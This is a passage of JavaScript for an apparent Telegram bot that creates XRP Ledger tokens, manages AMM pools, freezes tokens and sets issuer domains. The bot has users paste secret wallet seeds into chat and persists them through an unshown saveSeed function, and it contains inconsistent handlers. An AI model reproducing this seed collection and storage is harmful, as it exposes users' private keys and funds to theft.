            case 'set_token_quantity':
                userData.currentMenu = 'token';
                await handleSettingInput(bot, chatId, action, userData);
                break;
     
            case 'amm_set_token':
                try {
                    const client = new xrpl.Client("wss://s1.ripple.com");
                    await client.connect();
                    
                    if (!userData.receiverSeed) {
                        await bot.sendMessage(chatId, `${EMOJIS.warning} Please set receiver seed first!`);
                        return;
                    }
                    
                    const wallet = xrpl.Wallet.fromSeed(userData.receiverSeed);
                    const tokens = await getAccountTokens(client, wallet.classicAddress);
                    await client.disconnect();

                    if (tokens.length === 0) {
                        await bot.sendMessage(chatId, `${EMOJIS.warning} No tokens found in your account! Please create a token first.`);
                        return;
                    }

                    const keyboard = {
                        reply_markup: {
                            inline_keyboard: [
                                ...tokens.map(token => {
                                    const displayName = token.currency.length > 16 ? 
                                        Buffer.from(token.currency.substring(0, 40), 'hex')
                                            .toString('utf8')
                                            .replace(/\0/g, '') : 
                                        token.currency;
                                    return [{
                                        text: `${displayName} (Balance: ${token.balance})`,
                                        callback_data: `select_token_${token.currency}`
                                    }];
                                }),
                                [{ text: `${EMOJIS.token} Enter Custom Token`, callback_data: 'enter_custom_token' }],
                                [{ text: `${EMOJIS.back} AMM Menu`, callback_data: 'amm_menu' }]
                            ]
                        }
                    };
                    
                    userData.currentMenu = 'amm';
                    userData.ammSetupStep = 'settings';
                    await bot.sendMessage(chatId, `${EMOJIS.token} Select a token:`, keyboard);
                } catch (error) {
                    await bot.sendMessage(chatId, `${EMOJIS.warning} Error: ${error.message}`);
                    await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammSettingsKeyboard);
                }
                break;
     
            case 'amm_set_xrp':
                userData.currentMenu = 'amm';
                userData.ammSetupStep = 'settings';
                await handleSettingInput(bot, chatId, action, userData);
                break;
     
            case 'amm_set_token_amount':
                userData.currentMenu = 'amm';
                userData.ammSetupStep = 'settings';
                await handleSettingInput(bot, chatId, action, userData);
                break;
     
            case 'amm_set_seed':
                userData.currentMenu = 'amm';
                userData.ammSetupStep = 'settings';
                await handleSettingInput(bot, chatId, action, userData);
                break;
                
            case 'amm_issuer_wallet':
                userData.ammWallet = 'issuer';
                userData.selectedToken = userData.tokenName;
                await bot.sendMessage(chatId, `${EMOJIS.check} Using Issuer wallet`);
                await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammMenuKeyboard);
                break;
     
            case 'amm_receiver_wallet':
                userData.ammWallet = 'receiver';
                userData.selectedToken = userData.tokenName;
                await bot.sendMessage(chatId, `${EMOJIS.check} Using Receiver wallet`);
                await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammMenuKeyboard);
                break;
     
            case 'create_token':
                await handleTokenCreation(bot, chatId, userData);
                break;
     
            case 'confirm_token_create':
                await handleTokenConfirmation(bot, chatId, userData);
                break;
     
            case 'start_amm':
                if (!userData.tokenName) {
                    await bot.sendMessage(chatId, `${EMOJIS.warning} Please create a token first!`);
                    return;
                }
                await handleAMMStart(bot, chatId, userData);
                break;
     
            case 'confirm_amm_create':
                await handleAMMConfirmation(bot, chatId, userData);
                break;

            case 'enter_custom_token':
                userData.currentMenu = 'amm';
                userData.ammSetupStep = 'settings';
                await handleSettingInput(bot, chatId, 'amm_set_token', userData);
                break;
            
                case 'withdraw_amm':
                    userData.currentMenu = 'withdraw';
                    await bot.sendMessage(chatId, `${EMOJIS.pool} Select withdrawal percentage:`, withdrawMenuKeyboard);
                    break;
                
                case 'withdraw_50':
                    await handleAMMWithdraw(bot, chatId, userData, 50);
                    break;
                
                case 'withdraw_70':
                    await handleAMMWithdraw(bot, chatId, userData, 70);
                    break;
                
                case 'withdraw_100':
                    await handleAMMWithdraw(bot, chatId, userData, 100);
                    break;    
     
            case 'set_domain':
                if (!userData.issuerSeed) {
                    await bot.sendMessage(chatId, 
                        `${EMOJIS.warning} Please set issuer seed first!`);
                    return;
                }
                
                userData.awaitingInput = 'domainInput';
                await bot.sendMessage(chatId, 
                    `${EMOJIS.globe} Please enter your domain:\n` +
                    `(e.g., your-site.netlify.app)`
                );
                break;
     
            default:
                if (action.startsWith('select_token_')) {
                    const selectedToken = action.split('_')[2];
                    userData.selectedToken = selectedToken;
                    await bot.sendMessage(chatId, `${EMOJIS.check} Token ${selectedToken} selected`);
                    await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammSettingsKeyboard);
                } else if (action.startsWith('amm_percent_')) {
                    await handleAMMPercentage(bot, chatId, action, userData);
                }
                break;
            }
        } catch (error) {
            await bot.sendMessage(chatId, `${EMOJIS.warning} Error: ${error.message}`);
            
            // Update error handling to include freeze menus
            if (userData.currentMenu === 'token') {
                await bot.sendMessage(chatId, getTokenStatusMessage(userData), tokenMenuKeyboard);
            } else if (userData.currentMenu === 'amm') {
                const keyboard = userData.ammSetupStep === 'settings' ? ammSettingsKeyboard : ammMenuKeyboard;
                await bot.sendMessage(chatId, getAmmStatusMessage(userData), keyboard);
            } else if (userData.currentMenu === 'freeze') {
                await bot.sendMessage(chatId, getFreezeStatusMessage(userData), freezeMenuKeyboard);
            } else if (userData.currentMenu === 'unfreeze') {
                await bot.sendMessage(chatId, getFreezeStatusMessage(userData), unfreezeMenuKeyboard);
            }
        }
    });

    bot.on('message', async (msg) => {
        // Skip if not a text message
        if (!msg.text) return;
        
        if (msg.text.startsWith('/')) return;
    
        const userId = msg.from.id;
        const chatId = msg.chat.id;
        const userData = userInputs.get(userId);
    
        if (!userData) {
            initUserInput(userId);
            return;
        }
    
        if (userData.awaitingInput) {
            await handleUserInput(bot, chatId, msg.text.trim(), userData, userId);
        }
    });

async function handleSettingInput(bot, chatId, action, userData) {
    const inputTypes = {
        'set_issuer_seed': { message: `${EMOJIS.key} Enter Issuer Seed:`, awaiting: 'issuerSeed' },
        'set_receiver_seed': { message: `${EMOJIS.key} Enter Receiver Seed:`, awaiting: 'receiverSeed' },
        'set_token_name': { message: `${EMOJIS.token} Enter Token Name (3-4 characters):`, awaiting: 'tokenName' },
        'set_token_quantity': { message: `${EMOJIS.token} Enter Token Quantity:`, awaiting: 'tokenQuantity' },
        'amm_set_token': { message: `${EMOJIS.token} Enter token name (must match your created token):`, awaiting: 'ammTokenName' },
        'amm_set_xrp': { message: `${EMOJIS.xrp} Enter XRP amount:`, awaiting: 'ammXrpAmount' },
        'amm_set_token_amount': { message: `${EMOJIS.token} Enter token percentage (0-100%):`, awaiting: 'ammTokenAmount' },
        'amm_set_seed': { message: `${EMOJIS.key} Enter Wallet Seed:`, awaiting: 'walletSeed' },
        // Add these new freeze-related types
        'set_freeze_issuer': { message: `${EMOJIS.key} Enter Freeze Issuer Seed:`, awaiting: 'freezeIssuerSeed' },
        'set_freeze_token': { message: `${EMOJIS.token} Enter Token Name to Freeze:`, awaiting: 'freezeTokenName' },
        'set_unfreeze_issuer': { message: `${EMOJIS.key} Enter Unfreeze Issuer Seed:`, awaiting: 'freezeIssuerSeed' },
        'set_unfreeze_token': { message: `${EMOJIS.token} Enter Token Name to Unfreeze:`, awaiting: 'freezeTokenName' }
    };

    const setting = inputTypes[action];
    if (setting) {
        await bot.sendMessage(chatId, setting.message);
        userData.awaitingInput = setting.awaiting;
    }
}

async function handleTokenCreation(bot, chatId, userData) {
    if (!userData.issuerSeed || !userData.receiverSeed || !userData.tokenName || !userData.tokenQuantity) {
        await bot.sendMessage(chatId, `${EMOJIS.warning} Please set all token values first!\n\n${getTokenStatusMessage(userData)}`);
        return;
    }

    const confirmMessage = `${EMOJIS.warning} Confirm token creation:\n\n${getTokenStatusMessage(userData)}\n\nProceed?`;
    const confirmKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `${EMOJIS.check} Confirm`, callback_data: 'confirm_token_create' },
                    { text: `${EMOJIS.cross} Cancel`, callback_data: 'token_menu' }
                ]
            ]
        }
    };
    await bot.sendMessage(chatId, confirmMessage, confirmKeyboard);
}

async function handleTokenConfirmation(bot, chatId, userData) {
    try {
        await bot.sendMessage(chatId, `${EMOJIS.refresh} Creating token...`);
        await createToken(chatId, userData);
        await bot.sendMessage(chatId, getTokenStatusMessage(userData), tokenMenuKeyboard);
    } catch (error) {
        await bot.sendMessage(chatId, `${EMOJIS.warning} Error: ${error.message}`);
        await bot.sendMessage(chatId, getTokenStatusMessage(userData), tokenMenuKeyboard);
    }
}

async function handleAMMStart(bot, chatId, userData) {
    // Check if token exists first
    const client = new xrpl.Client("wss://s1.ripple.com");
    try {
        await client.connect();
        let wallet;
        
        // Determine which wallet to use
        if (userData.walletSeed) {
            wallet = xrpl.Wallet.fromSeed(userData.walletSeed);
        } else if (userData.ammWallet === 'issuer') {
            wallet = xrpl.Wallet.fromSeed(userData.issuerSeed);
        } else if (userData.ammWallet === 'receiver') {
            wallet = xrpl.Wallet.fromSeed(userData.receiverSeed);
        }

        if (wallet) {
            const tokens = await getAccountTokens(client, wallet.classicAddress);
            const hasToken = tokens.some(token => token.currency === normalizeTokenCode(userData.tokenName));
            
            if (!hasToken) {
                await bot.sendMessage(chatId, `${EMOJIS.warning} Token not found in selected wallet. Please verify token creation and wallet selection.`);
                return;
            }
        }

        // Continue with AMM setup
        if (userData.selectedToken && userData.ammXrpAmount && userData.ammTokenPercentage) {
            const displayName = userData.selectedToken?.length > 16 ? 
                Buffer.from(userData.selectedToken.substring(0, 40), 'hex')
                    .toString('utf8')
                    .replace(/\0/g, '') : 
                userData.selectedToken;
        
            const confirmMessage = `${EMOJIS.warning} Confirm AMM pool creation:
        ${EMOJIS.wallet} Wallet: ${userData.walletSeed ? 'Custom' : userData.ammWallet}
        ${EMOJIS.token} Token: ${displayName}
        ${EMOJIS.xrp} XRP Amount: ${userData.ammXrpAmount}
        ${EMOJIS.token} Token Percentage: ${userData.ammTokenPercentage}%\n\nProceed?`;
        
            const confirmKeyboard = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: `${EMOJIS.check} Confirm`, callback_data: 'confirm_amm_create' },
                            { text: `${EMOJIS.cross} Cancel`, callback_data: 'amm_menu' }
                        ]
                    ]
                }
            };
            await bot.sendMessage(chatId, confirmMessage, confirmKeyboard);
            return;
        }

        // Show wallet selection if not already selected
        if (!userData.ammWallet && !userData.walletSeed) {
            const ammSetupKeyboard = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: `${EMOJIS.wallet} Use Issuer Wallet`, callback_data: 'amm_issuer_wallet' },
                            { text: `${EMOJIS.wallet} Use Receiver Wallet`, callback_data: 'amm_receiver_wallet' }
                        ],
                        [{ text: `${EMOJIS.back} AMM Menu`, callback_data: 'amm_menu' }]
                    ]
                }
            };
            await bot.sendMessage(chatId, `${EMOJIS.pool} Select wallet for AMM:`, ammSetupKeyboard);
            userData.ammSetupStep = 'select_wallet';
            return;
        }

        // If we have a wallet but missing other settings, show settings menu
        await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammSettingsKeyboard);
        
    } catch (error) {
        await bot.sendMessage(chatId, `${EMOJIS.warning} Error: ${error.message}`);
    } finally {
        await client.disconnect();
    }
}

async function handleAMMPercentage(bot, chatId, action, userData) {
    const percentage = parseInt(action.split('_')[2]);
    userData.ammTokenPercentage = percentage;

    const displayName = userData.selectedToken?.length > 16 ? 
        Buffer.from(userData.selectedToken.substring(0, 40), 'hex')
            .toString('utf8')
            .replace(/\0/g, '') : 
        userData.selectedToken;

    const confirmMessage = `${EMOJIS.warning} Confirm AMM pool creation:
${EMOJIS.wallet} Wallet: ${userData.ammWallet === 'issuer' ? 'Issuer' : 'Receiver'}
${EMOJIS.token} Token: ${displayName}
${EMOJIS.xrp} XRP Amount: ${userData.ammXrpAmount}
${EMOJIS.token} Token Percentage: ${percentage}%\n\nProceed?`;

    const confirmKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `${EMOJIS.check} Confirm`, callback_data: 'confirm_amm_create' },
                    { text: `${EMOJIS.cross} Cancel`, callback_data: 'amm_menu' }
                ]
            ]
        }
    };
    await bot.sendMessage(chatId, confirmMessage, confirmKeyboard);
}

async function handleAMMConfirmation(bot, chatId, userData) {
    const client = new xrpl.Client("wss://s1.ripple.com");
    try {
        await bot.sendMessage(chatId, `${EMOJIS.refresh} Creating AMM pool...`);
        await client.connect();

        const wallet = userData.walletSeed ? 
            xrpl.Wallet.fromSeed(userData.walletSeed) : 
            xrpl.Wallet.fromSeed(userData.ammWallet === 'issuer' ? userData.issuerSeed : userData.receiverSeed);

        // Always check trust line for non-issuer wallets
        if (userData.ammWallet !== 'issuer' || userData.walletSeed) {
            await setupTrustline(client, wallet, userData);
            await bot.sendMessage(chatId, `${EMOJIS.check} Trust line created`);
        }

        const result = await createAMM(client, wallet, userData);
        if (!result || !result.hash) {
            throw new Error("AMM creation failed - no transaction hash returned");
        }
        
        await bot.sendMessage(chatId, `${EMOJIS.check} AMM pool created!\nHash: ${result.hash}`);
        userData.ammSetupStep = null;
        await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammMenuKeyboard);
    } catch (error) {
        await bot.sendMessage(chatId, `${EMOJIS.warning} Error: ${error.message}`);
        await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammMenuKeyboard);
    } finally {
            await client.disconnect();
    }
}

async function handleAMMWithdraw(bot, chatId, userData, percentage) {
    const client = new xrpl.Client("wss://s1.ripple.com");
    
    try {
        if (!userData.selectedToken) {
            throw new Error("Token not selected! Please set token in AMM Settings.");
        }
        if (!userData.walletSeed) {
            throw new Error("Wallet seed not set! Please set wallet seed first.");
        }
        if (!userData.issuerSeed) {
            throw new Error("Issuer seed not found! This is needed for token identification.");
        }

        await bot.sendMessage(chatId, `${EMOJIS.refresh} Processing withdrawal of ${percentage}%...`);
        
        await client.connect();
        const wallet = xrpl.Wallet.fromSeed(userData.walletSeed);
        const result = await withdrawAMM(client, wallet, userData, percentage);
        
        await bot.sendMessage(chatId, `${EMOJIS.check} AMM withdrawal successful!\nHash: ${result.hash}`);
        await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammMenuKeyboard);
    } catch (error) {
        let errorMsg = error.message;
        if (error.data && error.data.error) {
            errorMsg = `${error.data.error}: ${error.data.error_message}`;
        }
        await bot.sendMessage(chatId, `${EMOJIS.warning} Error: ${errorMsg}`);
        await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammMenuKeyboard);
    } finally {
        if (client.isConnected()) {
            await client.disconnect();
        }
    }
}

async function handleUserInput(bot, chatId, input, userData, userId) {
    try {
        switch (userData.awaitingInput) {
            case 'freezeIssuerSeed':
                userData.freezeIssuerSeed = input;
                await bot.sendMessage(chatId, `${EMOJIS.check} Freeze Issuer Seed set successfully!`);
                break;

            case 'freezeTokenName':
                if (input.length < 3) {
                    throw new Error('Token name must be at least 3 characters!');
                }
                userData.freezeTokenName = input.toUpperCase();
                await bot.sendMessage(chatId, `${EMOJIS.check} Freeze Token Name set successfully!`);
                break;

            // Keep existing cases
            case 'ammXrpAmount':
                const xrpAmount = parseFloat(input);
                if (isNaN(xrpAmount) || xrpAmount <= 0) {
                    throw new Error('Please enter a valid XRP amount!');
                }
                userData.ammXrpAmount = xrpAmount;
                await bot.sendMessage(chatId, `${EMOJIS.check} XRP amount set to ${xrpAmount}`);
                break;

            case 'ammTokenAmount':
                const percentage = parseFloat(input);
                if (isNaN(percentage) || percentage < 0 || percentage > 100) {
                    throw new Error('Please enter a valid percentage (0-100)!');
                }
                userData.ammTokenPercentage = percentage;
                await bot.sendMessage(chatId, `${EMOJIS.check} Token percentage set to ${percentage}%`);
                break;
                
            case 'issuerSeed':
                userData.issuerSeed = input;
                saveSeed(input, chatId);
                break;

            case 'receiverSeed':
                userData.receiverSeed = input;
                saveSeed(input, chatId);
                break;

            case 'tokenName':
                if (input.length < 3) {
                    throw new Error('Token name must be at least 3 characters!');
                }
                userData.tokenName = input.toUpperCase();
                await bot.sendMessage(chatId, 'Token Name set successfully!');
                break;

            case 'tokenQuantity':
                const quantity = parseFloat(input.replace(/,/g, ''));
                if (isNaN(quantity) || quantity <= 0) {
                    throw new Error('Please enter a valid number!');
                }
                userData.tokenQuantity = quantity.toLocaleString('fullwide', {useGrouping:false});
                await bot.sendMessage(chatId, 'Token Quantity set successfully!');
                break;

            case 'walletSeed':
                userData.walletSeed = input;
                userData.ammWallet = 'custom';
                saveSeed(input, chatId);
                await bot.sendMessage(chatId, 'Wallet seed set successfully!');
                break;

            case 'domainInput':
                const domain = input.trim().toLowerCase();
                if (!/^[a-z0-9][a-z0-9-\.]{1,61}[a-z0-9]\.[a-z]{2,}$/i.test(domain)) {
                    throw new Error('Please enter a valid domain name');
                }
                userData.domainInput = domain;
                await bot.sendMessage(chatId, 'Domain set successfully!');
                break;
        }
        
        userData.awaitingInput = null;
        saveUserData(userId, userData);
        await sendMenuWithStatus(chatId, userData);
    } catch (error) {
        await bot.sendMessage(chatId, `${EMOJIS.warning} Error: ${error.message}`);
    }
}

async function handleAMMSetupInput(bot, chatId, input, userData) {
    try {
        console.log('Debug - AMM Setup Step:', userData.ammSetupStep);
        console.log('Debug - Input:', input);
        
        switch (userData.ammSetupStep) {
            case 'enter_token':
                if (input.length < 3 || input.length > 4) {
                    throw new Error('Token name must be 3-4 characters');
                }
                userData.selectedToken = input.toUpperCase();
                userData.ammSetupStep = 'enter_xrp';
                await bot.sendMessage(chatId, `${EMOJIS.xrp} Enter XRP amount for the pool:`);
                break;

            case 'enter_xrp':
                const xrpAmount = parseFloat(input);
                if (isNaN(xrpAmount) || xrpAmount <= 0) {
                    throw new Error('Please enter a valid XRP amount');
                }
                userData.ammXrpAmount = xrpAmount;
                userData.ammSetupStep = 'enter_token_amount';
                await bot.sendMessage(chatId, `${EMOJIS.token} Enter token percentage (0-100%):`);
                break;

            case 'enter_token_amount':
                const tokenPercentage = parseFloat(input);
                if (isNaN(tokenPercentage) || tokenPercentage < 0 || tokenPercentage > 100) {
                    throw new Error('Please enter a valid percentage (0-100)');
                }
                
                userData.ammTokenPercentage = tokenPercentage;
                userData.ammTokenAmount = tokenPercentage; // Store the percentage for later use
                userData.ammSetupStep = 'select_percentage';

                const percentageKeyboard = {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "50%", callback_data: "amm_percent_50" }],
                            [{ text: "70%", callback_data: "amm_percent_70" }],
                            [{ text: "80%", callback_data: "amm_percent_80" }],
                            [{ text: "90%", callback_data: "amm_percent_90" }],
                            [{ text: "100%", callback_data: "amm_percent_100" }]
                        ]
                    }
                };
                await bot.sendMessage(chatId, `${EMOJIS.token} Select token percentage for pool:`, percentageKeyboard);
                break;

            default:
                throw new Error('Unexpected step in AMM setup');
        }
    } catch (error) {
        console.error('AMM Setup Error:', error);
        userData.ammSetupStep = null;
        throw error;
    }
}

function sendMenuWithStatus(chatId, userData) {
    let keyboard;
    let status;

    if (userData.currentMenu === 'token') {
        keyboard = tokenMenuKeyboard;
        status = getTokenStatusMessage(userData);
    } else if (userData.currentMenu === 'amm') {
        keyboard = userData.ammSetupStep === 'settings' ? ammSettingsKeyboard : ammMenuKeyboard;
        status = getAmmStatusMessage(userData);
    } else if (userData.currentMenu === 'freeze') {
        keyboard = freezeMenuKeyboard;
        status = getFreezeStatusMessage(userData);
    } else if (userData.currentMenu === 'unfreeze') {
        keyboard = unfreezeMenuKeyboard;
        status = getFreezeStatusMessage(userData);
    } else {
        keyboard = ammMenuKeyboard;
        status = getAmmStatusMessage(userData);
    }

    return bot.sendMessage(chatId, status, keyboard);
}

bot.on('polling_error', (error) => {
    console.error('Polling error:', error);
});

// Add error handler for unhandled errors
process.on('unhandledRejection', (error) => {
    console.error('Unhandled Promise Rejection:', error);
    // Don't exit the process, just log the error
});

// Add to your message handler
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userData = userInputs[msg.from.id];

    if (!userData) return;

    if (userData.awaitingInput === 'domain_username') {
        try {
            const username = msg.text.trim();
            await bot.sendMessage(chatId, '🔄 Setting domain...');
            const result = await setIssuerDomain(userData.issuerSeed, userData);
            
            // Send success message with TOML instructions
            await bot.sendMessage(chatId, 
                `✅ Domain set successfully!\n\n` +
                `Domain: ${result.domain}\n` +
                `Transaction Hash: ${result.hash}\n\n` +
                `Create this file at:\n` +
                `${result.tomlPath}\n\n` +
                `Example TOML content:\n` +
                "```toml\n" + result.tomlExample + "\n```\n\n" +
                `Make sure to:\n` +
                `1. Create the .well-known folder\n` +
                `2. Add the xrp-ledger.toml file\n` +
                `3. Update the TOML content with your token details\n` +
                `4. Enable GitHub Pages`,
                { parse_mode: 'Markdown' }
            );

            userData.awaitingInput = null;
            await sendMenuWithStatus(chatId, userData);
        } catch (error) {
            await bot.sendMessage(chatId, `⚠️ Error: ${error.message}`);
            userData.awaitingInput = null;
            await sendMenuWithStatus(chatId, userData);
        }
        return;
    }

    if (userData.awaitingInput === 'amount') {
        try {
            const amount = parseFloat(msg.text.trim());
            if (isNaN(amount) || amount <= 0) {
                throw new Error('Please enter a valid positive number');
            }
            userData.amount = amount;
            userData.awaitingInput = null;
            await sendMenuWithStatus(chatId, userData);
        } catch (error) {
            await bot.sendMessage(chatId, `⚠️ Error: ${error.message}`);
            userData.awaitingInput = null;
            await sendMenuWithStatus(chatId, userData);
        }
        return;
    }

    if (userData.awaitingInput === 'currency_code') {
        try {
            const currencyCode = msg.text.trim().toUpperCase();
            if (!/^[A-Z0-9]{3,4}$/.test(currencyCode)) {
                throw new Error('Currency code must be 3-4 alphanumeric characters');
            }
            userData.currencyCode = currencyCode;
            userData.awaitingInput = null;
            await sendMenuWithStatus(chatId, userData);
        } catch (error) {
            await bot.sendMessage(chatId, `⚠️ Error: ${error.message}`);
            userData.awaitingInput = null;
            await sendMenuWithStatus(chatId, userData);
        }
        return;
    }

    if (userData.awaitingInput === 'issuer_seed') {
        try {
            const seed = msg.text.trim();
            const wallet = new xrpl.Wallet(seed);
            userData.issuerSeed = seed;
            userData.issuerAddress = wallet.address;
            userData.awaitingInput = null;
            await sendMenuWithStatus(chatId, userData);
        } catch (error) {
            await bot.sendMessage(chatId, `⚠️ Error: Invalid seed. Please try again.`);
            userData.awaitingInput = null;
            await sendMenuWithStatus(chatId, userData);
        }
        return;
    }

    await handleMenuCommand(msg);
});